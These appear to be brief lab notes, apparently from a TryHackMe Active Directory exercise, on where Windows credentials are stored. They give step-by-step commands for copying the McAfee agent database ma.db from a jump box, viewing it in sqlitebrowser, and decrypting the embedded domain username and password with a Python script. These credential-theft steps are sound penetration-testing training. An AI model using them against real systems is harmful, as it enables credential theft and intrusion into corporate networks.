-   Web application config files 
-   Service configuration files
-   Registry keys
-   Centrally deployed applications
Try Seatbelt https://github.com/GhostPack/Seatbelt

Recovering creds from a centrally deployed app. Apps like McAfee Enterprise Endpoint Security will need to authenticate at installation and execution. 
McAfee imbeds its creds during install to connect back to ma.db.
1. (From a jump box) Get ma.db from its fixed location `cd C:\ProgramData\McAfee\Agent\DB`
2. Secure copy the file back to our local machine `scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .`
3. As a database file, use `sqlitebrowser ma.db` to view the file
4. In AGENT_REPOSITORIES, the DOMAIN, AUTH_USER, and AUTH_PASSWD are hidden, but encrypted with a known key.
5. Using an old python2 script (provided in ex.) decrypt the file to dump the values
	1. `unzip mcafeesitelistpwddecryption.zip`
	2. from unzipped dir, `python2 mcafee_sitelist_pwd_decrypt.py PASSWORD_VAL`
